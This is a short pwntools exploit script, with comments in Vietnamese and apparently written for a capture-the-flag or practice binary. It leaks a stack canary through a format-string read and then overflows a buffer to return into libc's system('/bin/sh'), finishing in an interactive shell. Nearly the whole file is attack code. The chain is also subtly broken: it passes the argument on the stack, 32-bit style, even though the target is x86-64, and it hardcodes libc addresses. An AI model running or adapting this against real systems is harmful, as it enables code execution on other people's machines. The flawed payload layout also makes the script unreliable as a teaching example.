from pwn import *

# Bắt đầu chương trình
io = process('./vulnerable')

# Leak canary
io.sendline(b'%11$p')
canary = int(io.recvline().split() [2], 16)
log.info(f"Canary: {hex(canary)}")

# Địa chỉ của các hàm và chuỗi trong libc
system_addr = 0x7ffff7e26ab0      # Địa chỉ của hàm system trong libc
exit_addr = 0x7ffff7e18b30        # Địa chỉ của hàm exit trong libc
bin_sh_addr = 0x7ffff7f71034      # Địa chỉ của chuỗi "/bin/sh"

# Xây dựng payload
payload = b'A' * 40               # Ghi đè lên buffer đến canary
payload += p64(canary)            # Ghi đè lại canary đã leak
payload += b'A' * 8               # Padding để ghi đè saved RBP
payload += p64(system_addr)       # Ghi đè địa chỉ trả về bằng hàm system
payload += p64(exit_addr)         # Sau khi gọi system, gọi exit
payload += p64(bin_sh_addr)       # Tham số cho system("/bin/sh")

# Gửi payload
io.sendline(payload)

# Tương tác với shell
io.interactive()
